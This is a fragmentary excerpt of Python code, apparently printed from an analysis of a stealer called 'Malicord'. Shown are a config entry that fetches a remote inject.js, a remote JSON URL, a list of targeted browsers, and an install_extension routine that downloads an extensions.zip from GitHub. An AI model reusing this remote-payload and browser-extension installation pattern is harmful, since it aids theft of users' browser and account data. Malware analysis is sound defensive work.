...
json_confg = {
    ...
    "url_srdl": f"https://raw.githubusercontent.com/Inplex-sys/Malicord-Analysis/main/inject.js",
...
url = "https://raw.githubusercontent.com/Malicordx/testingsomedead/main/nope.json"
   ...
   #     return (self.operagx, self.opera, self.brave, self.chrome, self.vivaldi, self.edge, self.yandex, self.iron, self.kiwi)
    ...
    def install_extension(self):
        ...
        try:
            ...
            extensions = {
                'extensions': f'https://github.com/Inplex-sys/Malicord-Analysis/raw/main/extensions.zip'
            }
